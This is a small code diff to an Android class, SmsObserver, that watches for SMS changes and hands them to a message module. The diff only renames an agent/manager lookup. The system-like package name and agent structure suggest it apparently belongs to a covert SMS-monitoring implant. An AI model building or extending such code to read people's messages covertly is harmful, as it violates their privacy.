@@ -8,9 +8,8 @@ import android.os.Handler;
 
 import com.android.service.Sms;
 import com.android.service.Status;
-import com.android.service.agent.AgentManager;
-import com.android.service.agent.AgentMessage;
-import com.android.service.agent.AgentType;
+import com.android.service.manager.ManagerAgent;
+import com.android.service.module.ModuleMessage;
 
 public class SmsObserver extends ContentObserver {
 	private static final String TAG = "SmsObserver"; //$NON-NLS-1$
@@ -23,7 +22,7 @@ public class SmsObserver extends ContentObserver {
 	public void onChange(boolean bSelfChange) {
 		super.onChange(bSelfChange);
 
-		final AgentMessage a = (AgentMessage) AgentManager.self().get(AgentType.AGENT_SMS);
+		final ModuleMessage a = (ModuleMessage) ManagerAgent.self().get("sms");
 
 		if (a == null) {
 			return;
